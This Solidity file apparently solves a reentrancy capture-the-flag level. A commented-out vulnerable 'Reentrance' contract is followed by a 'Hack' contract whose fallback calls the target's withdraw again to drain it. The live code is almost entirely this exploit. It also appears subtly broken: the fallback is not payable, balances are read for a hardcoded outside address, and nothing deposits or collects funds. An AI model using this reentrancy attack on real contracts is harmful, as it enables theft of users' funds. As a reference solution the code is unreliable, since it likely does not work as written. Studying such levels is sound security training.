// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

// contract Reentrance {
//     using SafeMath for uint256;
//     mapping(address => uint256) public balances;

//     function donate(address _to) public payable {
//         balances[_to] = balances[_to].add(msg.value);
//     }

//     function balanceOf(address _who) public view returns (uint256 balance) {
//         return balances[_who];
//     }

//     function withdraw(uint256 _amount) public {
//         if (balances[msg.sender] >= _amount) {
//             (bool result, ) = msg.sender.call{value: _amount}("");
//             if (result) {
//                 _amount;
//             }
//             balances[msg.sender] -= _amount;
//         }
//     }

//     receive() external payable {}
// }
interface IReentrance {
    function withdraw(uint256 _amount) external;

    function balanceOf(address _who) external view returns (uint256 balance);
}

contract Hack {
    IReentrance public reentrance;

    constructor(address _ad) {
        reentrance = IReentrance(_ad);
    }

    function wit() external {
        uint256 amount = reentrance.balanceOf(
            0xAB8508E4aaB60caa2EE94fa10B4D1239648854C4
        );
        reentrance.withdraw(amount);
    }

    fallback() external {
        uint256 amount = reentrance.balanceOf(
            0xAB8508E4aaB60caa2EE94fa10B4D1239648854C4
        );
        reentrance.withdraw(amount);
    }
}
